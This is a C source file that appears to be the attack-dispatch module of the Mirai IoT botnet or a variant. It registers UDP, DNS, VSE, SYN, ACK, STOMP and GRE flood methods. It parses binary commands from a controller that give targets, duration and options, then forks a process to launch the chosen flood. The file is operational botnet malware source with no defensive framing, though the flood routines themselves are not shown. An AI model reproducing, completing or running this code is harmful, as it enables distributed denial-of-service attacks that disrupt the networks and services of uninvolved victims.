#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>

#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"
#include "scanner.h"


uint8_t methods_len = 0;
struct attack_method **methods = NULL;
int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};

BOOL attack_init(void)
{
    int i = 0;

    add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp_generic);
    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
    add_attack(ATK_VEC_DNS, (ATTACK_FUNC)attack_udp_dns);
	add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);

    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
    add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_tcp_stomp);

    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
    add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);

    return TRUE;
}

void attack_parse(char *buf, int len)
{
    int i = 0;
    uint32_t duration;
    ATTACK_VECTOR vector;
    uint8_t targs_len, opts_len;
    struct attack_target *targs = NULL;
    struct attack_option *opts = NULL;

    if(len < sizeof(uint32_t))
        goto cleanup;

    duration = ntohl(*((uint32_t *)buf));
    buf += sizeof(uint32_t);
    len -= sizeof(uint32_t);

    if(len == 0)
        goto cleanup;

    vector = (ATTACK_VECTOR)*buf++;
    len -= sizeof(uint8_t);

    if(len == 0)
        goto cleanup;

    targs_len = (uint8_t)*buf++;
    len -= sizeof(uint8_t);
    if(targs_len == 0)
        goto cleanup;

    if(len < ((sizeof(ipv4_t) + sizeof(uint8_t)) * targs_len))
        goto cleanup;

    targs = calloc(targs_len, sizeof(struct attack_target));
    for(i = 0; i < targs_len; i++)
    {
        targs[i].addr = *((ipv4_t *)buf);
        buf += sizeof(ipv4_t);
        targs[i].netmask = (uint8_t)*buf++;
        len -= (sizeof(ipv4_t) + sizeof(uint8_t));

        targs[i].sock_addr.sin_family = AF_INET;
        targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
    }

    if(len < sizeof(uint8_t))
        goto cleanup;

    opts_len = (uint8_t)*buf++;
    len -= sizeof(uint8_t);

    if(opts_len > 0)
    {
        opts = calloc(opts_len, sizeof(struct attack_option));
        for(i = 0; i < opts_len; i++)
        {
            uint8_t val_len;

            if(len < sizeof(uint8_t))
                goto cleanup;

            opts[i].key = (uint8_t)*buf++;
            len -= sizeof(uint8_t);

            if(len < sizeof(uint8_t))
                goto cleanup;

            val_len = (uint8_t)*buf++;
            len -= sizeof(uint8_t);

            if(len < val_len)
                goto cleanup;

            opts[i].val = calloc(val_len + 1, sizeof(char));
            util_memcpy(opts[i].val, buf, val_len);
            buf += val_len;
            len -= val_len;
        }
    }

    errno = 0;
    attack_start(duration, vector, targs_len, targs, opts_len, opts);

    cleanup:
    if(targs != NULL)
        free(targs);
    if(opts != NULL)
        free_opts(opts, opts_len);
}

void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int pid = fork();
    if(pid > 0 || pid == -1)
        return;

    int i = 0;

    for(i = 0; i < methods_len; i++)
    {
        if(methods[i]->vector == vector)
        {
            #ifdef DEBUG
                printf("[attack] starting attack...\n");
            #endif
            methods[i]->func(duration, targs_len, targs, opts_len, opts);
            break;
        }
    }

    exit(0);
}

char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)
{
    int i = 0;

    for(i = 0; i < opts_len; i++)
    {
        if(opts[i].key == opt)
            return opts[i].val;
    }

    return def;
}

int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    if(val == NULL)
        return def;
    else
        return util_atoi(val, 10);
}

uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    if(val == NULL)
        return def;
    else
        return inet_addr(val);
}

static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)
{
    struct attack_method *method = calloc(1, sizeof(struct attack_method));

    method->vector = vector;
    method->func = func;

    methods = realloc(methods, (methods_len + 1) * sizeof(struct attack_method *));
    methods[methods_len++] = method;
}

static void free_opts(struct attack_option *opts, int len)
{
    int i = 0;

    if(opts == NULL)
        return;

    for(i = 0; i < len; i++)
    {
        if(opts[i].val != NULL)
            free(opts[i].val);
    }

    free(opts);
}
